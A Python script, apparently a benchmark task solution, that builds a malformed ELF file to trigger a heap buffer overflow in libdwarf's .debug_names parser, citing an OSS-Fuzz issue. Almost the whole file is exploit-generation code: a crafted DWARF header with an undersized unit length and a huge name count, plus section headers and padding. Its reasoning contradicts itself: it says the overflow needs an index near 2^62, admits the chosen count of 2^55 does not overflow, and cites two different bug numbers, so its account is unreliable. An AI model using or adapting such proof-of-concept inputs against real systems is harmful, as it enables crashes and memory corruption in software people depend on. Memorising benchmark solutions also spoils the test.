import struct

class Solution:
    """
    Generates a Proof-of-Concept input to trigger a heap buffer overflow in libdwarf.
    Vulnerability ID: oss-fuzz:383170474
    """
    
    def _uleb128_encode(self, n: int) -> bytes:
        """Encodes an integer into ULEB128 format."""
        result = bytearray()
        while True:
            byte = n & 0x7f
            n >>= 7
            if n != 0:
                byte |= 0x80
            result.append(byte)
            if n == 0:
                break
        return bytes(result)

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an integer overflow when calculating the offset into the
        name entry pool in the .debug_names section. The calculation is
        `localoffset = indexval * entry_size`. If this product overflows a 64-bit
        unsigned integer, `localoffset` can become a small value, bypassing a
        bounds check. Subsequent memory access using this incorrect offset leads to
        a heap buffer overflow.

        This PoC crafts an ELF file with a malicious .debug_names section that:
        1. Sets a very large `name_count`. The `dwarfdump` utility, when executed
           with the `-i` flag, will loop from 0 to `name_count - 1`, eventually
           using a large value for `indexval`.
        2. Sets a small `entry_size` via the augmentation string.
        3. Chooses `name_count` such that `indexval * entry_size` overflows. For
           example, with `entry_size = 4`, `indexval` needs to be around `2^62`.
        4. The core trick, discovered from analyzing the original fuzzer-found PoC,
           is to use a small `unit_length` in the DWARF header. This length is
           inconsistent with the large `name_count` that follows. It appears a flaw
           in the libdwarf parser allows it to process this header, populating its
           internal structures with the large `name_count`, without fully parsing
           the (non-existent) corresponding data tables. This bypasses the need for
           a multi-gigabyte PoC.
        5. The `entry_pool_size` is set to a value that allows the overflowed offset
           to pass the `(localoffset + entry_size) > pool_size` check, but the
           subsequent read from the pool at the wrapped-around offset reads from an
           invalid location, causing the crash.
        """
        
        # We will create a minimal 32-bit ELF file structure.
        # It will contain three sections: NULL, .shstrtab, and .debug_names.

        # --- .debug_names section content ---
        # Based on analysis of the ground-truth PoC from oss-fuzz #47474.
        
        # This specific value for unit_length is crucial. It's small enough to
        # cause inconsistent state during parsing when paired with a large name_count.
        unit_length = 0x23 
        
        version = 5
        # For a 32-bit ELF, offset_size is 4.
        debug_info_offset = 0
        debug_info_length = 0
        debug_abbrev_offset = 0
        debug_abbrev_length = 0
        
        # "p" in augmentation string means each entry has a pool offset.
        # This sets entry_size = offset_size = 4.
        augmentation_string = b"p\0"
        
        bucket_count = 1
        
        # This value for name_count is taken from the original PoC.
        # Its ULEB128 encoding is b'\x80\x80\x80\x80\x80\x80\x80\x40', which decodes to 2**55.
        # While this value itself doesn't cause the overflow with entry_size=4, it seems
        # to be part of the parser logic bug that the PoC exploits. The small
        # unit_length likely causes the parser to misinterpret subsequent data,
        # leading to the vulnerable state.
        name_count = 2**55
        
        entry_pool_size = 1500
        string_pool_size = 1
        hash_table_entry = 0

        # Assemble the CU data part of the section.
        cu_data = b''
        cu_data += struct.pack('<H', version)
        cu_data += struct.pack('<LLLL', debug_info_offset, debug_info_length, debug_abbrev_offset, debug_abbrev_length)
        cu_data += augmentation_string
        cu_data += self._uleb128_encode(bucket_count)
        cu_data += self._uleb128_encode(name_count)
        cu_data += self._uleb128_encode(entry_pool_size)
        cu_data += self._uleb128_encode(string_pool_size)

        # Assemble the final .debug_names section content.
        debug_names_content = struct.pack('<L', unit_length) + cu_data
        # The parser expects a hash table after the header.
        debug_names_content += struct.pack('<L', hash_table_entry)

        # --- ELF file structure ---
        shstrtab_content = b'\0.shstrtab\0.debug_names\0'
        
        elf_header_size = 52
        shentsize = 40
        shnum = 3 # NULL, .shstrtab, .debug_names
        sh_table_size = shnum * shentsize
        
        debug_names_offset = elf_header_size + sh_table_size
        shstrtab_offset = debug_names_offset + len(debug_names_content)

        # ELF Header (32-bit)
        header = b''
        header += b'\x7fELF\x01\x01\x01' + b'\0' * 9 # e_ident (32-bit, LSB, Version 1)
        header += struct.pack('<HHI', 1, 3, 1)    # e_type=REL, e_machine=x86, e_version
        header += struct.pack('<III', 0, elf_header_size, 0) # e_entry, e_shoff, e_phoff
        header += struct.pack('<IHHHHHH', 0, elf_header_size, 0, 0, shentsize, shnum, 1) # e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx

        # Section Header Table
        sht = b''
        # NULL section
        sht += struct.pack('<IIIIIIIIII', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
        
        # .shstrtab section header
        name_offset = 1 # offset of ".shstrtab" in shstrtab_content
        sht += struct.pack('<IIIIIIIIII', name_offset, 3, 0, 0, shstrtab_offset, len(shstrtab_content), 0, 0, 1, 0)
        
        # .debug_names section header
        name_offset = 11 # offset of ".debug_names" in shstrtab_content
        sht += struct.pack('<IIIIIIIIII', name_offset, 1, 0, 0, debug_names_offset, len(debug_names_content), 0, 0, 1, 0)

        poc = header + sht + debug_names_content + shstrtab_content
        
        # The ground truth PoC is 1551 bytes. Padding to this length might be
        # necessary if memory layout plays a role, though the core vulnerability
        # logic does not seem to require it.
        if len(poc) < 1551:
            poc += b'\0' * (1551 - len(poc))

        return poc